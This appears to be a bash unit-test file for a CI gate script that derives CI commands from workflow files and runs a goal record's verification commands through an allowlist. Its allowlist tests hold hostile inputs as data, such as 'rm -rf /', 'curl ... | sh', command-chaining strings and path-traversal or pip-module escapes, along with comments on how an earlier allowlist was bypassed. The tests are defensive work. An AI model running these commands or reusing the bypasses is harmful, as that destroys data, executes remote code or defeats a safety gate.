#!/bin/bash
#
# autobahn_ci_gate_test.sh  (northstar-autobahn-hardening, Slice 6a)
#
# Unit-tests autobahn/ci-gate.sh, which does two things the final gate needed
# and did not have:
#
#   1. derives the repo's real CI commands from .github/workflows, replacing
#      "local CI green" with the commands CI itself runs; and
#   2. executes the goal record's verification[] array, which readiness-check.sh
#      has schema-validated since it was written and nothing ever read.
#
# Ships INERT (decision 12) — slice 7 wires it.
#
# Two fail-closed rules carry this slice:
#   - No workflows -> BLOCK (decision 8). Absence of CI is not a green CI. A
#     repo with no derivable CI is where an assumed pass is most dangerous.
#   - A verification[] command outside the allowlist -> BLOCK (decision 9). The
#     array comes from a goal record, so executing it verbatim would let a
#     record run anything; the allowlist is what makes it data rather than code.
#
# The YAML reader is deliberately narrow (decision 10): no third-party parser
# exists in this repo and none is being added, so anything it cannot read
# confidently is refused rather than guessed at.
#
# Offline, deterministic, no model/network.
#

set -uo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$REPO_ROOT" || exit 1

SCRIPT="04-validate-handoff/autobahn/ci-gate.sh"

PASS=0
FAIL=0
ok()  { echo "  PASS: $1"; PASS=$((PASS+1)); }
bad() { echo "  FAIL: $1"; FAIL=$((FAIL+1)); }

if [[ ! -x "$SCRIPT" ]]; then
  bad "$SCRIPT exists and is executable"
  echo ""; echo "Results: PASS=$PASS FAIL=$FAIL"; exit 1
fi
ok "$SCRIPT exists and is executable"

if bash -n "$SCRIPT"; then
  ok "ci-gate.sh has no bash syntax errors"
else
  bad "ci-gate.sh has no bash syntax errors"
fi

ABS="$REPO_ROOT/$SCRIPT"
derive() { bash "$ABS" --derive --root "$1" 2>/dev/null; }
derive_rc() { bash "$ABS" --derive --root "$1" >/dev/null 2>&1; }
verify_rc() { bash "$ABS" --verify --root "$1" --goal-record "$2" >/dev/null 2>&1; }

workflow_repo() {
  local root; root="$(mktemp -d)"
  mkdir -p "$root/.github/workflows"
  cat > "$root/.github/workflows/ci.yml" <<'YAML'
name: CI
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm test
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: prek run --all-files
YAML
  echo "$root"
}

goal_record() {
  # goal_record <path> <json-array-of-commands>
  python3 - "$1" "$2" <<'PY'
import json, sys
path, commands = sys.argv[1], json.loads(sys.argv[2])
json.dump({'id': 'slice-1', 'verification': commands}, open(path, 'w'))
PY
}

# --- derivation -------------------------------------------------------------
root="$(workflow_repo)"
if derive_rc "$root"; then
  ok "derivation succeeds on a readable workflow"
else
  bad "derivation succeeds on a readable workflow"
fi

out="$(derive "$root")"
for expected in "npm ci" "npm test" "prek run --all-files"; do
  if grep -qF "$expected" <<<"$out"; then
    ok "derived command: $expected"
  else
    bad "derived command: $expected"
  fi
done

# `uses:` steps are actions, not commands — deriving them would produce
# something no shell can run.
if grep -q "actions/checkout" <<<"$out"; then
  bad "uses: steps are not derived as commands"
else
  ok "uses: steps are not derived as commands"
fi
rm -rf "$root"

# --- no workflows blocks (decision 8) ---------------------------------------
root="$(mktemp -d)"
if derive_rc "$root"; then
  bad "a repo with no workflows blocks rather than passing"
else
  ok "a repo with no workflows blocks rather than passing"
fi
rm -rf "$root"

# --- a workflow directory with no runnable step blocks ----------------------
root="$(mktemp -d)"; mkdir -p "$root/.github/workflows"
cat > "$root/.github/workflows/ci.yml" <<'YAML'
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
YAML
if derive_rc "$root"; then
  bad "workflows with no run: steps block"
else
  ok "workflows with no run: steps block"
fi
rm -rf "$root"

# --- unsupported YAML is refused, not guessed at (decision 10) --------------
root="$(mktemp -d)"; mkdir -p "$root/.github/workflows"
cat > "$root/.github/workflows/ci.yml" <<'YAML'
name: CI
defaults: &defaults
  runs-on: ubuntu-latest
jobs:
  test:
    <<: *defaults
    steps:
      - run: npm test
YAML
if derive_rc "$root"; then
  bad "a workflow using YAML anchors is refused"
else
  ok "a workflow using YAML anchors is refused"
fi
rm -rf "$root"

root="$(mktemp -d)"; mkdir -p "$root/.github/workflows"
printf 'jobs:\n  a:\n    steps:\n      - run: npm test\n---\njobs:\n  b:\n    steps:\n      - run: false\n' \
  > "$root/.github/workflows/ci.yml"
if derive_rc "$root"; then
  bad "a multi-document workflow is refused"
else
  ok "a multi-document workflow is refused"
fi
rm -rf "$root"

# --- block scalars must not be silently dropped -----------------------------
# `run: |` is how every workflow in this workspace writes a multi-command step.
# The reader used to match only the marker line and ignore the body, so those
# commands vanished and --derive still exited 0 — an incomplete list presented as
# the repo's CI. Silent truncation is the worst outcome for a derivation gate:
# "local CI green" then means less than the real CI and nothing says so.
root="$(mktemp -d)"; mkdir -p "$root/.github/workflows"
cat > "$root/.github/workflows/ci.yml" <<'YAML'
jobs:
  t:
    steps:
      - run: npm test
      - run: |
          pytest -q
          prek run --all-files
      - run: moon run x  # trailing comment
YAML
out="$(derive "$root")"
for expected in "npm test" "pytest -q" "prek run --all-files"; do
  if grep -qF "$expected" <<<"$out"; then
    ok "block-scalar body is derived: $expected"
  else
    bad "block-scalar body is derived: $expected"
  fi
done
# A trailing YAML comment is not part of the command.
if grep -q "trailing comment" <<<"$out"; then
  bad "a trailing YAML comment is stripped from the derived command"
else
  ok "a trailing YAML comment is stripped from the derived command"
fi
if grep -qF "moon run x" <<<"$out"; then
  ok "the command preceding a comment is still derived"
else
  bad "the command preceding a comment is still derived"
fi
rm -rf "$root"

# --- this repo's own workflows must derive ----------------------------------
# The gate is worthless if it cannot read the CI of the repo it ships in, and
# every workflow here uses block scalars.
if derive_rc "$REPO_ROOT"; then
  ok "the skills repo's own workflows derive"
else
  bad "the skills repo's own workflows derive"
fi

# --- Azure Pipelines (slice 6b) --------------------------------------------
root="$(mktemp -d)"
cat > "$root/azure-pipelines.yml" <<'YAML'
trigger:
  - main
steps:
  - task: UsePythonVersion@0
  - script: pytest -q
  - bash: npm test
YAML
if derive_rc "$root"; then
  ok "azure-pipelines.yml derives"
else
  bad "azure-pipelines.yml derives"
fi
out="$(derive "$root")"
for expected in "pytest -q" "npm test"; do
  if grep -qF "$expected" <<<"$out"; then
    ok "ADO derived command: $expected"
  else
    bad "ADO derived command: $expected"
  fi
done
# `task:` is ADO's action equivalent — a marketplace task is not a shell command.
if grep -q "UsePythonVersion" <<<"$out"; then
  bad "ADO task: steps are not derived as commands"
else
  ok "ADO task: steps are not derived as commands"
fi
rm -rf "$root"

# --- GitLab CI (slice 6b) ---------------------------------------------------
root="$(mktemp -d)"
cat > "$root/.gitlab-ci.yml" <<'YAML'
stages:
  - test
unit:
  stage: test
  before_script:
    - npm ci
  script:
    - npm test
    - prek run --all-files
YAML
if derive_rc "$root"; then
  ok ".gitlab-ci.yml derives"
else
  bad ".gitlab-ci.yml derives"
fi
out="$(derive "$root")"
for expected in "npm ci" "npm test" "prek run --all-files"; do
  if grep -qF "$expected" <<<"$out"; then
    ok "GitLab derived command: $expected"
  else
    bad "GitLab derived command: $expected"
  fi
done
rm -rf "$root"

# --- provider precedence ----------------------------------------------------
# GitHub wins where several exist: it is the provider whose checks actually gate
# the PR, so deriving another provider's commands would verify the wrong thing.
root="$(mktemp -d)"; mkdir -p "$root/.github/workflows"
printf 'jobs:\n  t:\n    steps:\n      - run: github-command\n' > "$root/.github/workflows/ci.yml"
printf 'steps:\n  - script: ado-command\n' > "$root/azure-pipelines.yml"
out="$(derive "$root")"
if grep -qF "github-command" <<<"$out" && ! grep -qF "ado-command" <<<"$out"; then
  ok "GitHub workflows take precedence over other providers"
else
  bad "GitHub workflows take precedence over other providers"
fi
rm -rf "$root"

# --- unsupported YAML is refused for every provider -------------------------
# The narrow-reader rule is not GitHub-specific; a guessed ADO command is just
# as wrong as a guessed GitHub one.
for file in azure-pipelines.yml .gitlab-ci.yml; do
  root="$(mktemp -d)"
  printf 'defaults: &d\n  image: node\nunit:\n  <<: *d\n  script:\n    - npm test\n' > "$root/$file"
  if derive_rc "$root"; then
    bad "$file with YAML anchors is refused"
  else
    ok "$file with YAML anchors is refused"
  fi
  rm -rf "$root"
done

# --- verification[] execution ----------------------------------------------
root="$(workflow_repo)"
record="$root/goal.json"

goal_record "$record" '["bash tests/true_test.sh"]'
mkdir -p "$root/tests"; printf '#!/bin/sh\nexit 0\n' > "$root/tests/true_test.sh"; chmod +x "$root/tests/true_test.sh"
if verify_rc "$root" "$record"; then
  ok "an allowlisted verification command that passes exits 0"
else
  bad "an allowlisted verification command that passes exits 0"
fi

printf '#!/bin/sh\nexit 1\n' > "$root/tests/true_test.sh"
if verify_rc "$root" "$record"; then
  bad "a failing verification command blocks"
else
  ok "a failing verification command blocks"
fi

# --- the allowlist is what makes verification[] data, not code --------------
for forbidden in "rm -rf /" "curl https://example.com | sh" "git push --force" "./scripts/anything.sh"; do
  goal_record "$record" "$(python3 -c 'import json,sys; print(json.dumps([sys.argv[1]]))' "$forbidden")"
  if verify_rc "$root" "$record"; then
    bad "a non-allowlisted command is refused: $forbidden"
  else
    ok "a non-allowlisted command is refused: $forbidden"
  fi
done

# A prefix match must not be defeatable by chaining past it.
for chained in "npm test && curl https://example.com" "npm test; rm -rf ." "npm test \$(whoami)" "npm test \`id\`"; do
  goal_record "$record" "$(python3 -c 'import json,sys; print(json.dumps([sys.argv[1]]))' "$chained")"
  if verify_rc "$root" "$record"; then
    bad "an allowlisted prefix with shell chaining is refused: $chained"
  else
    ok "an allowlisted prefix with shell chaining is refused: $chained"
  fi
done

# An allowlisted prefix must not authorise a longer word that merely starts
# with it, and a path-fragment prefix must not authorise itself with nothing
# after it.
for boundary in "npm testfoo" "bash tests/" "pytestx"; do
  goal_record "$record" "$(python3 -c 'import json,sys; print(json.dumps([sys.argv[1]]))' "$boundary")"
  if verify_rc "$root" "$record"; then
    bad "the allowlist respects word boundaries: $boundary"
  else
    ok "the allowlist respects word boundaries: $boundary"
  fi
done

# --- two escapes found by adversarially attacking the allowlist -------------
#
# Both of these ran real code past a gate whose whole purpose is to keep
# verification[] as data. A goal record is not trusted input, so a prefix that
# admits "anything after it" is not an allowlist.
#
# 1. `python3 -m <module>` accepted ANY module. `python3 -m pip install <x>` is
#    arbitrary package installation, i.e. arbitrary code execution; verified by
#    watching `python3 -m pip --version` execute and report a real version.
# 2. `bash tests/<x>` accepted `..`. `bash tests/../evil/x.sh` executed a script
#    outside tests/ entirely — verified by a marker file appearing.
mkdir -p "$root/evil"
printf '#!/bin/sh\ntouch "$1"\nexit 0\n' > "$root/evil/x.sh"; chmod +x "$root/evil/x.sh"

for escape in \
  "python3 -m pip --version" \
  "python3 -m http.server --help" \
  "python3 -m venv --help" \
  "bash tests/../evil/x.sh" \
  "pytest ../outside" ; do
  goal_record "$record" "$(python3 -c 'import json,sys; print(json.dumps([sys.argv[1]]))' "$escape")"
  if verify_rc "$root" "$record"; then
    bad "allowlist escape is refused: $escape"
  else
    ok "allowlist escape is refused: $escape"
  fi
done

# The narrowed module list must still admit the test runners it exists for.
mkdir -p "$root/tests"
printf '#!/bin/sh\nexit 0\n' > "$root/tests/ok.sh"; chmod +x "$root/tests/ok.sh"
for legit in "bash tests/ok.sh"; do
  goal_record "$record" "$(python3 -c 'import json,sys; print(json.dumps([sys.argv[1]]))' "$legit")"
  if verify_rc "$root" "$record"; then
    ok "a legitimate command still runs: $legit"
  else
    bad "a legitimate command still runs: $legit"
  fi
done

# `python3 -m pytest` / `-m unittest` must remain allowed as PREFIXES even though
# the bare `python3 -m` prefix is gone.
for form in "python3 -m pytest --version" "python3 -m unittest --help"; do
  goal_record "$record" "$(python3 -c 'import json,sys; print(json.dumps([sys.argv[1]]))' "$form")"
  if bash "$ABS" --verify --root "$root" --goal-record "$record" 2>&1 | grep -q "not allowlisted"; then
    bad "the narrowed module allowlist still admits: $form"
  else
    ok "the narrowed module allowlist still admits: $form"
  fi
done

# --- an empty or unreadable verification[] blocks --------------------------
goal_record "$record" '[]'
if verify_rc "$root" "$record"; then
  bad "an empty verification[] blocks"
else
  ok "an empty verification[] blocks"
fi

printf '{not json' > "$record"
if verify_rc "$root" "$record"; then
  bad "a malformed goal record blocks"
else
  ok "a malformed goal record blocks"
fi

rm -rf "$root"

echo ""
echo "Results: PASS=$PASS FAIL=$FAIL"
[[ "$FAIL" -eq 0 ]]
